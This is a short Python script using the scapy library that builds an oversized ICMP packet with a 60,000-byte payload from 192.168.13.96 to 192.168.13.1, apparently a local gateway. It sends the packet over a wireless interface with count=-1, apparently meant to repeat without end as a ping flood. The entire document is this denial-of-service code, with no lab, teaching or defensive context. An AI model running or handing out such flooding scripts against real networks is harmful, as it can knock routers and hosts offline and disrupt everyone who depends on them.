from scapy.all import *

packet = IP(src="192.168.13.96", dst="192.168.13.1")/ICMP()/("a" * 60000)

send(packet, count=-1, iface="wlp3s0")
